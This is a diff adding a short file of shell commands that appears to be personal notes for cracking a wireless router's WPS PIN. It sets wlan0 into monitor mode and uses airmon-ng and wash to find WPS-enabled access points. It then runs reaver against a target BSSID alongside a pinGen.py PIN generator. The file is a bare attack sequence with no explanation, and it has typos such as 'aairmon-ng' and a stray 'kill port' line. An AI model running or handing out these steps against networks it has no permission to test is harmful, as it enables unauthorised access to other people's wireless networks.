@@ -1,0 +1,39 @@
+ifconfig wlan0 down
+
+su
+
+route
+
+ifconfig 
+
+
+ifconfig wlan0
+
+
+ifconfig wlan0 | grep inet
+
+
+iwconfig wlan0 mode monitor
+
+
+ifconfig wlan0 up
+
+
+aairmon-ng wlan0
+
+
+airmon-ng check wlan0
+
+
+kill port
+
+
+service network-manager restart
+
+wash -i wlan0
+reaver -i wlan0 -b BSSID -c 6 -r 2
+pinGen.py
+./pinGen.py BSSID
+reaver -i wlan0 -b BSSID -c 6 -r 2:60 -vv
+
+
